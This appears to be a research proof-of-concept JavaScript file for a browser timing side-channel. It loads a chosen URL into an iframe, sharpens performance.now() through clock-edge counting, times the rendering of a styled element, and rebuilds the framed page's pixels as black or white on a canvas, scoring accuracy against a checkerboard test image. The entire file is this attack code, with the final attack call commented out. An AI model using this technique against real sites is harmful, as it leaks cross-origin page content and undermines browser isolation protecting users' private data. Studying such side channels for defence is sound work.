function nextedge(){
    start = performance.now();
    stop = start;
    count = 0;
    while(start == stop){
        stop = performance.now();
        count++;
    }
    return [count,start,stop];
}

function median(values) {

    values.sort( function(a,b) {return a - b;} );

    var half = Math.floor(values.length/2);

    if(values.length % 2)
        return values[half];
    else
        return (values[half-1] + values[half]) / 2.0;
}

//calculate tick grain
var tick_grain = 1;
for(i = 0; i < 100; i++){
    nextedge();
    [exp,start,stop] = nextedge();
    tick_grain = Math.min((stop-start)/exp, tick_grain);
}
console.log("grain: ", tick_grain);

var haltFlag;

var size;


function debug(text) {
    //  document.getElementById("debug").innerHTML += text.replace("\n", "<br/>\n");
}

function status(text) {
    document.getElementById("status").innerHTML = text.replace("\n", "<br/>\n");
}

function run() {

    console.log("Starting attack\n");

    // Set the target iframe and the reference iframe to the target URL
    var frame = document.getElementById("frame");
    var framemirror = document.getElementById("framemirror");
    frame.src = document.getElementById("url").value;
    framemirror.src = document.getElementById("url").value;

    // Wait until the target frame finishes loading
    size = document.getElementById("size").value;
    status("Loading target...\n");
    frame.onload = function() { frame.onload = null; init(size); }
}

function halt() {
    haltFlag = true;
}

var ctx;

var width = 48, height = 48;
function init(sz) {
    size = sz;
    document.getElementById("debug").innerHTML = "";

    var canvas = document.getElementById("canvas");
    ctx = canvas.getContext("2d");

    ctx.fillStyle = "#808080";
    ctx.fillRect(0, 0, width, height);

    status("Finding threshold\n");
    findThresholdBetter(sz);
}
var x=0,y=0;
function runAttack(midpt) {
    status("Running reconstruction\n");
    var white_errors = 0;
    var black_errors = 0;

    console.log("size: " + size + "\n");
    console.log("midpt: " + midpt + "\n");

    var i = 0;
    var scroll = document.getElementById("scroll");
    var pixel = document.getElementById("pixel");


    var exec = function() {
        if(haltFlag) { return; }
        console.log(x,y);

        scroll.scrollLeft = x;
        scroll.scrollTop = y;

        var pixel = document.getElementById("pixel");
        pixel.className = "pixel";
        result = [];
        checks = 5;
        requestAnimationFrame(function(){

        getTiming(function(result) {
            console.log(result);
            if(result < midpt) {
                //black
                ctx.fillStyle = "#ffffff";
                black_errors += checkError(0,x,y);
            } else {
                ctx.fillStyle = "#000000";
                white_errors += checkError(1,x,y);
            }
            ctx.fillRect(x, y, 1, 1);
            x = x+5
                if(x >= width){
                    x = 0;
                    y = y+5;
                }
            if(y >= height){
                var d = new Date();
                debug("Stop Time " + d.getTime()+"\n");
                status("Done!\n");
                console.log("48x48 px checkerboard stats, only meaningful on that test image\n");
                console.log("White errors: "+white_errors+" ("+(white_errors/(width*height))*100.0+"% )\n");
                console.log("Black errors: "+black_errors+" ("+(black_errors/(width*height))*100.0+"% )\n");
                console.log("Accuracy: "+(1-((black_errors+white_errors)/(width*height)))*100.0+"%\n");
                return;
            }

            //exec(x,y);
            exec();
            //getTimingBetter();
        });

        });
    };
    //var d = new Date();
    //debug("Starting at " + d.getTime()+"\n");
    exec();

}

//This is manually defined for the testing image
function checkError(color,x,y) {
    if ((Math.floor(x/12)+Math.floor(y/12))%2 == color){
        return 0;
    }
    return 1;
}

var bresult = [];
var wresult = [];
var bchecks = 5;
var wchecks = 5;
var result = [];
var checks = 5;

var pixel = document.getElementById("pixel");

function findThresholdBetter(size) {
    bresult = [];
    wresult = [];
    bchecks = 20;
    wchecks = 20;

    pixel = document.getElementById("pixel");
    pixel.style.width = size + "px";
    pixel.style.height = size + "px";

    //pixel.classList.add("threshold");
    //pixel.className = "white";
    pixel.className = "black";
    getTimingBetter();
}

function getTimingBetter(){
    var pixel = document.getElementById("pixel");
    pixel.classList.add("timing");

    //clock edge get start
    nextedge();
    [exp,pre,hrt_st] = nextedge();

    //var hrt_st = performance.now();
    requestAnimationFrame(function(startTime) {
        //clock edge get end
        [remain,stop,post] = nextedge();
        var hrt_end = post - remain * tick_grain;
        //var hrt_end = performance.now();
        pixel.classList.remove("timing");
        requestAnimationFrame(function(endTime) {
            if((hrt_end - hrt_st) > 50 || (hrt_end - hrt_st) < 35) {
                getTimingBetter();
            } else {
                delta = hrt_end - hrt_st;
                if(pixel.className == "black"){
                    bchecks--;
                    bresult.push(delta);
                    pixel.className = "white";
                    getTimingBetter();
                }
                else{
                    wchecks--;
                    wresult.push(delta);
                    pixel.className = "black";
                    if(wchecks != 0){
                        getTimingBetter();
                    }
                    else{
                        bavg = bresult.reduce(function(a, b) { return a + b; })/bresult.length;
                        wavg = wresult.reduce(function(a, b) { return a + b; })/wresult.length;
                        //bavg = median(bresult);
                        //wavg = median(wresult);
                        console.log("Black: Avg:"+bavg+" ::"+bresult+"\n");
                        console.log("White: Avg:"+wavg+" ::"+wresult+"\n");
                        //runAttack((bavg+wavg)/2);
                    }
                }
            }
        });
    });
    //timeBlack();
}

function timeBlack(){
    var pixel = document.getElementById("pixel");
    //pixel.className = "black";
    pixel.className = "white";
    result = [];
    checks = 1;
    requestAnimationFrame(function(){
        getTiming(function(res){
            if(bchecks != 0){
                bchecks--;
                bresult.push(res);
                timeWhite();
            }
            else{
                bavg = bresult.reduce(function(a, b) { return a + b; })/bresult.length;
                console.log(bresult.length);
                console.log("Black: Avg:"+bavg+"\n");
                timeWhite();
            }
        });
    });
}

function timeWhite(){
    var pixel = document.getElementById("pixel");
    //pixel.className = "white";
    pixel.className = "black";
    result = [];
    checks = 1;
    requestAnimationFrame(function(){
        getTiming(function(res){
            if(wchecks != 0){
                wchecks--;
                wresult.push(res);
                timeBlack();
            }
            else{
                wavg = wresult.reduce(function(a, b) { return a + b; })/wresult.length;
                console.log(wresult.length);
                console.log("White: Avg:"+wavg+"\n");
            }
        });
    });
}

function getTiming(done) {
    var pixel = document.getElementById("pixel");
    pixel.classList.add("timing");
    //var hrt_st = performance.now();
    //clock edge get start
    nextedge();
    [exp,pre,hrt_st] = nextedge();
    requestAnimationFrame(function(startTime) {
        //clock edge get end
        [remain,stop,post] = nextedge();
        var hrt_end = post - remain * tick_grain;
        //var hrt_end = performance.now();
        pixel.classList.remove("timing");
        requestAnimationFrame(function(endTime) {
            if((hrt_end - hrt_st) < 12) {
                getTiming(done);
                //done(endTime - startTime);
            } else {
                result.push(hrt_end - hrt_st);
                if(checks != 0){
                    getTiming(done);
                    checks--;
                }else{
                    //console.log(result.length);
                    done(result.reduce(function(a, b) { return a + b; })/result.length);
                    //done(median(result));
                }
            }
        });
    });
}

function isNear(left, right) {
    return (left < (right * 1.3)) && (right < (left * 1.3));
}

